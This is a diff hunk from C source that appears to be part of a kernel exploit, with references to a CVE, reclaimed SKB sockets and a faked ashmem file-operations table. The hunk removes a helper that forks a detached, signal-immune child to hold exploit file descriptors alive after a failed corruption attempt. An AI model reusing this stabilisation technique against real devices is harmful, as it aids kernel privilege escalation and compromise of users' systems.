@@ -520,47 +520,6 @@ void close_reclaim_sockets(void) {
     reclaim_batch_close(b);
 }
 
-/* Detach a child that inherits the reclaim SKB sockets (and any other
- * payload fds).  If a failed attempt left ashmem_misc.fops pointing at a
- * fake table, this keeps that page allocated so a later misc_open cannot
- * dispatch through recycled junk.  PDEATHSIG is cleared and the child
- * calls setsid so a supervisor/app teardown does not reap it. */
-pid_t spawn_stability_keeper(void) {
-  pid_t child = SYSCHK(fork());
-  if (child != 0) {
-    return child;
-  }
-
-  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
-  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
-  syscall(SYS_setsid);
-
-  int null_fd = (int)syscall(
-      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
-  if (null_fd >= 0) {
-    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
-      if (null_fd != fd) {
-        syscall(SYS_dup3, null_fd, fd, 0);
-      }
-    }
-    if (null_fd > STDERR_FILENO) {
-      syscall(SYS_close, null_fd);
-    }
-  } else {
-    syscall(SYS_close, STDIN_FILENO);
-    syscall(SYS_close, STDOUT_FILENO);
-    syscall(SYS_close, STDERR_FILENO);
-  }
-
-  struct timespec hold = {
-    .tv_sec = 86400,
-    .tv_nsec = 0,
-  };
-  for (;;) {
-    syscall(SYS_nanosleep, &hold, NULL);
-  }
-}
-
 void close_ctx_memfds(struct mm_ctx *ctx) {
   for (size_t i = 0; i < ctx->mm_cnt; i++) {
     if (ctx->memfds[i] > 0) {
